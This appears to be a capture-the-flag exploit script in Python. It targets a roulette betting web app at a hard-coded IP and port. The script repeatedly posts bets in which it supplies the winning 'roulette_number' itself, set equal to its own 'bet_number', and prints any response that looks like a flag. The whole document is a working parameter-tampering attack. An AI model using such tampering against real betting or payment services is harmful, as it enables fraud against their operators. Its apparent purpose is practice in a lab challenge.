import requests
import io
import random

session = requests.Session()

root = session.get("http://173.249.53.220:37283")
for _ in range(10):
  r = random.randint(0, 15)
  data = {
    "amount": (None, "10"),
    "bet_number": (None, str(r)),
    "roulette_number": (None, str(r))
  }
  post = session.post("http://173.249.53.220:37283/bet", files=data)
  if post.text.startswith("RQST"):
    print(post.text)

